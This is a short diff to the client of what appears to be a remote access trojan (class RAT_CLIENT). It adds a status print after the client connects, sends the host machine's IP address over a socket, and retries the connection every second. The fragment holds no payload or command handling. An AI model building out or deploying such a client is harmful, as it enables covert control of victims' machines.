@@ -50,6 +50,7 @@ class RAT_CLIENT:
                 sending = socket.gethostbyname(socket.gethostname())
                 s.send(sending.encode())
                 connected = True
+                print("Connect Establish")
             except socket.error as e:
                 print("Attempting to connect...")
                 time.sleep(1)
